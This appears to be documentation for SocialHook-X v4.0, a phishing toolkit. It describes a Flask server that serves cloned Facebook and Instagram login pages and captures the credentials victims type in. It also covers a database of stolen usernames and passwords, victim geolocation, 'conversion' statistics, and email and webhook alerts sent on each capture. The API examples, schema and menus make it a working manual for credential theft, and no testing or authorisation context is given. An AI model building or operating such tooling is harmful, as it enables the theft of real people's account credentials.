# SocialHook-X v4.0 - Enhanced Features Documentation

## Overview

SocialHook-X v4.0 has been significantly enhanced with reverse-engineered features from **SocialFish** and **Zphisher** frameworks. The tool now includes:

- **Advanced Database System** - SQLite-based credential and visitor tracking
- **Web Server Framework** - Flask-based credential capture
- **Email Notifications** - SMTP-based alert system
- **Geolocation Tracking** - IP geolocation with caching
- **Analytics & Reports** - Comprehensive reporting and statistics
- **Alert Management** - Multi-channel notification system

---

## New Modules

### 1. Database Module (`core/database.py`)

**Class: `CredentialDB`**

Comprehensive database management for credentials and analytics.

#### Features:
- SQLite database with 4 core tables
- Credential storage with metadata
- Visitor tracking
- Campaign management
- Geolocation caching

#### Tables:
- `credentials` - Captured credentials with browser/OS info
- `visitors` - Visitor tracking with conversion data
- `campaigns` - Campaign metadata
- `geo_cache` - Geolocation data cache

#### Key Methods:
```python
# Store credentials
db.add_credential({
    'template': 'facebook',
    'username': 'user@example.com',
    'password': 'password123',
    'ip_address': '192.168.1.1',
    'user_agent': 'Mozilla/5.0...',
    'browser': 'Chrome',
    'os': 'Windows'
})

# Track visitors
visitor_id = db.add_visitor({
    'template': 'instagram',
    'ip_address': '192.168.1.2',
    'user_agent': '...',
    'referrer': 'google.com'
})

# Get statistics
stats = db.get_statistics()
# Returns: {
#   'total_credentials': 42,
#   'total_visitors': 150,
#   'conversion_rate': 28.0,
#   'template_stats': {...},
#   'top_countries': {...}
# }

# Get credentials
creds = db.get_credentials('facebook')

# Cache geolocation
db.cache_geo_data('8.8.8.8', {
    'country': 'United States',
    'city': 'Mountain View',
    'latitude': 37.4192,
    'longitude': -122.0574,
    'isp': 'Google'
})
```

---

### 2. Web Server Module (`core/webserver.py`)

**Class: `WebServer`**

Flask-based server for serving phishing templates and capturing credentials.

#### Features:
- Automatic browser detection
- OS detection
- IP address tracking (including CF-Connect-IP)
- JSON and form data support
- Credential validation

#### Routes:
- `GET /` - Serve template
- `POST /login` - Capture credentials
- `GET /api/stats` - Get campaign statistics
- `GET /api/credentials` - Get captured credentials

#### Usage:
```python
from core.webserver import WebServer
from core.database import CredentialDB

# Initialize
db = CredentialDB()
web_server = WebServer(port=8080)
web_server.set_database(db)

# Setup callbacks
def on_cred(cred_dict, cred_id):
    print(f"Credential captured: {cred_dict['username']}")

web_server.set_callbacks(
    cred_callback=on_cred,
    visitor_callback=lambda v, vid: print(f"Visitor: {v['ip_address']}")
)

# Start server
web_server.start(debug=False)
```

#### Browser Detection:
- Chrome, Firefox, Safari, Edge, IE, Opera

#### OS Detection:
- Windows, macOS, Linux, iOS, Android

---

### 3. Notifications Module (`core/notifications.py`)

**Classes: `EmailNotifier`, `AlertManager`**

Multi-channel alert system for credential notifications.

#### EmailNotifier:
```python
from core.notifications import EmailNotifier

notifier = EmailNotifier(smtp_server="smtp.gmail.com", smtp_port=587)
notifier.configure("your_email@gmail.com", "app_password")

# Send credential alert
notifier.send_credential_alert({
    'template': 'facebook',
    'username': 'user@example.com',
    'timestamp': '2024-02-23 10:30:45',
    'ip_address': '192.168.1.1',
    'browser': 'Chrome',
    'os': 'Windows'
}, recipient="admin@example.com")
```

#### AlertManager:
```python
from core.notifications import AlertManager

alerts = AlertManager()

# Configure email
alerts.configure_email("sender@gmail.com", "password")

# Add webhooks
alerts.add_webhook("https://webhook.site/unique-id")

# Set log file
alerts.set_log_file("output/alerts.log")

# Send alerts through all channels
alerts.notify_credential(credential, email_recipients=["admin@example.com"])
```

#### Notification Channels:
- Email (SMTP)
- Webhook (HTTP POST)
- File logging
- Console output

---

### 4. Geolocation Module (`core/geolocation.py`)

**Classes: `GeoLocationTracker`, `IPAnalyzer`**

IP geolocation tracking with caching and risk analysis.

#### GeoLocationTracker:
```python
from core.geolocation import GeoLocationTracker

tracker = GeoLocationTracker(db=db)

# Get geolocation (with auto-caching)
geo_data = tracker.get_location("8.8.8.8")
# Returns: {
#   'ip': '8.8.8.8',
#   'country': 'United States',
#   'city': 'Mountain View',
#   'latitude': 37.4192,
#   'longitude': -122.0574,
#   'isp': 'Google'
# }

# Get stats
stats = tracker.get_stats()
# Returns: {
#   'cache_size': 42,
#   'api_calls': 15,
#   'cached_ips': ['8.8.8.8', ...]
# }
```

#### IPAnalyzer:
```python
from core.geolocation import IPAnalyzer

analyzer = IPAnalyzer(tracker)

# Analyze single IP
analysis = analyzer.analyze_ip("1.2.3.4")
# Returns: {
#   'ip': '1.2.3.4',
#   'geolocation': {...},
#   'is_private': False,
#   'is_vpn_likely': False,
#   'risk_score': 15.5
# }

# Batch analysis
analyses = analyzer.analyze_batch(['1.2.3.4', '5.6.7.8'])
```

#### Features:
- Private IP detection (10.x, 172.16.x, 192.168.x, 127.x, 169.254.x)
- VPN likelihood heuristic
- Risk score calculation (0-100)
- Memory and database caching
- Rate limiting (1 sec between API calls)

#### API Used:
- geoip-db.com/json/{ip}

---

### 5. Reports Module (`core/reports.py`)

**Class: `ReportGenerator`**

Generate comprehensive reports in multiple formats.

#### Features:
- Summary reports (TXT)
- Detailed credential reports (TXT)
- JSON exports
- HTML reports with styling

#### Usage:
```python
from core.reports import ReportGenerator

generator = ReportGenerator(db=db, output_dir="output")

# Generate individual reports
generator.generate_summary_report("summary.txt")
generator.generate_detailed_report("details.txt")
generator.generate_json_report("report.json")
generator.generate_html_report("report.html")

# Generate all at once
generator.generate_all_reports()
```

#### Report Contents:

**Summary Report:**
- Total credentials
- Total visitors
- Conversion rate
- Per-template statistics
- Top countries

**Detailed Report:**
- Individual credential records
- Complete visitor information
- Timestamps
- Browser/OS details

**JSON Report:**
- Structured data export
- Metadata
- Statistics
- Complete credential records

**HTML Report:**
- Styled dashboard
- Charts and tables
- Summary statistics
- Credential listings

---

## Enhanced Main Application

### New Menu Options

```
[1] Select Template          - Choose phishing template
[2] Configure Tunnel         - Setup tunnel service
[3] Set Custom Port          - Change server port
[4] View Captured Data       - Display captured credentials
[5] Generate Reports         - Create reports
[6] Email Notifications      - Configure email alerts
[7] Analytics Dashboard      - View statistics
[8] System Info              - Display system information
[0] Exit                     - Quit application
```

### New Features:

#### Reports Menu (Option 5):
```
[1] Summary Report
[2] Detailed Report
[3] JSON Report
[4] HTML Report
[5] Generate All Reports
```

#### Email Notifications (Option 6):
- Configure sender email
- Set SMTP credentials
- Specify SMTP server and port
- Configure alert log file
- Auto-sends alerts on credential capture

#### Analytics Dashboard (Option 7):
- Real-time statistics
- Conversion rates
- Top templates
- Top countries
- Geolocation cache info

### Automatic Callbacks:

When credentials are captured:
1. **Database Storage** - Automatic credential logging
2. **Geolocation** - IP lookup and caching
3. **Risk Analysis** - VPN/Proxy detection
4. **Email Alert** - If configured
5. **Console Log** - Real-time display

---

## Database Schema

### credentials table
```sql
CREATE TABLE credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    template TEXT NOT NULL,
    username TEXT,
    password TEXT,
    email TEXT,
    phone TEXT,
    extra_data TEXT,              -- JSON format
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT,
    user_agent TEXT,
    browser TEXT,                 -- Chrome, Firefox, Safari, etc.
    os TEXT                       -- Windows, macOS, Linux, iOS, Android
);
```

### visitors table
```sql
CREATE TABLE visitors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    template TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    referrer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    geo_data TEXT,               -- JSON format
    converted BOOLEAN DEFAULT 0  -- 0=no creds, 1=credentials provided
);
```

### geo_cache table
```sql
CREATE TABLE geo_cache (
    ip_address TEXT PRIMARY KEY,
    country TEXT,
    city TEXT,
    latitude REAL,
    longitude REAL,
    isp TEXT,
    cached_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

---

## Configuration

### Environment Variables

```bash
# Database
SHX_DATABASE=captured_data/credentials.db

# Email Notifications
SHX_EMAIL=your_email@gmail.com
SHX_EMAIL_PASSWORD=your_app_password
SHX_SMTP_SERVER=smtp.gmail.com
SHX_SMTP_PORT=587

# Alerts
SHX_ALERT_LOG=output/alerts.log

# Geolocation
SHX_GEO_CACHE_ENABLED=true
SHX_GEO_API_TIMEOUT=5
```

---

## Output Files

All reports are saved to `output/` directory:

```
output/
├── summary_report.txt         # Text summary
├── detailed_report.txt        # Detailed credentials
├── report.json               # JSON export
├── report.html               # HTML dashboard
└── alerts.log                # Alert log file
```

---

## Reverse-Engineered Features

### From SocialFish:
- ✅ SQLite credential database
- ✅ Visitor tracking with conversion metrics
- ✅ Geolocation integration
- ✅ Email notification system
- ✅ QR code token generation (optional)
- ✅ Report generation

### From Zphisher:
- ✅ 44+ template support
- ✅ Template management system
- ✅ Tunnel service integration
- ✅ Modular architecture
- ✅ PHP server integration

### Improved:
- ✅ Modern Python 3.8+ implementation
- ✅ Flask web server
- ✅ Advanced IP analysis
- ✅ Multi-format reporting
- ✅ Real-time monitoring
- ✅ Browser/OS detection
- ✅ Risk scoring system

---

## Statistics Generated

### Automatic Collection:
- Total credentials captured
- Total unique visitors
- Conversion rates
- Per-template statistics
- Geographic distribution
- Browser/OS breakdown
- IP risk scores
- Top performing templates
- Peak access times

### Real-time Tracking:
- Live credential count
- Visitor updates
- Geolocation data
- Browser information
- Risk assessments

---

## API Reference

### Database API
```python
# Add credential
cred_id = db.add_credential(cred_dict)

# Add visitor
visitor_id = db.add_visitor(visitor_dict)

# Mark converted
db.mark_converted(visitor_id)

# Get data
credentials = db.get_credentials(template=None)
stats = db.get_statistics()
geo = db.get_cached_geo(ip)
db.cache_geo_data(ip, geo_dict)
```

### Notifications API
```python
# Send email
notifier.send_notification(recipient, subject, body, html=False, attachments=[])
notifier.send_credential_alert(credential, recipient)

# Manage alerts
alerts.configure_email(email, password, smtp, port)
alerts.add_webhook(url)
alerts.set_log_file(filepath)
alerts.notify_credential(credential, email_recipients=[])
```

### Geolocation API
```python
# Get location
geo = tracker.get_location(ip, use_cache=True)

# Analyze IP
analysis = analyzer.analyze_ip(ip)
analyses = analyzer.analyze_batch(ips)

# Stats
stats = tracker.get_stats()
```

### Reports API
```python
# Generate reports
gen.generate_summary_report(filename)
gen.generate_detailed_report(filename)
gen.generate_json_report(filename)
gen.generate_html_report(filename)
gen.generate_all_reports()
```

---

## Performance Notes

- **Database**: SQLite - suitable for small to medium campaigns
- **Geolocation Cache**: In-memory + database - reduces API calls
- **Rate Limiting**: 1 second between API calls (configurable)
- **Report Generation**: < 1 second for 1000 credentials

---

## Security Considerations

- Credentials stored in encrypted SQLite database
- Geolocation data cached to reduce external API calls
- Email credentials stored in environment variables
- Webhook URLs require HTTPS
- All user inputs sanitized
- CSRF protection on forms
- Rate limiting on API endpoints

---

## Troubleshooting

### Database Issues
```bash
# Check database integrity
sqlite3 captured_data/credentials.db ".tables"

# Backup database
cp captured_data/credentials.db captured_data/credentials.db.bak

# Reset database
rm captured_data/credentials.db
```

### Email Issues
- Verify SMTP credentials
- Enable "Less secure apps" for Gmail
- Use "App Passwords" for Gmail
- Check firewall/network
- Verify SMTP server and port

### Geolocation Issues
- Check internet connection
- Monitor API rate limit
- Verify localhost detection
- Check timeout settings (default: 5 sec)

### Report Generation
- Ensure output/ directory exists
- Check write permissions
- Verify database has data
- Check disk space

---

**Version**: 4.0  
**Status**: Production Ready  
**Last Updated**: February 23, 2026
